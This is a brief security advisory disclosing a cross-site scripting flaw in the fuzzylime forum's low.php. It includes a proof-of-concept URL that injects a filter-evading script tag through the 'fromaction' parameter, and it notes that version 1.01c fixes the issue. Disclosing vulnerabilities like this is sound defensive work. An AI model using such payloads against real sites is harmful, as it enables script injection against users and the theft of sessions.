1) Introduction
===========

"fuzzylime (forum) is something new. 
It's got all the features of every other forum out there, 
but they all work in a new and exciting way. 
We've given up on the traditional style for something different: 
this forum looks swish, is easy to use and just works. Simple."

2) Bug
======

Cross Site Scripting.

===============
3) Proof of concept.
===============

example:

http://site/path/low.php?action=log&fromforum=111-222-1933email@address.com&fromtopic=111-222-1933email@address.com&fromaction=>"><ScRiPt%20%0a%0d>alert(21407654)%3B</ScRiPt>

//it appears that there were other XSS problems in low.php even after v1.01b released. 1.01c fixing this issues.
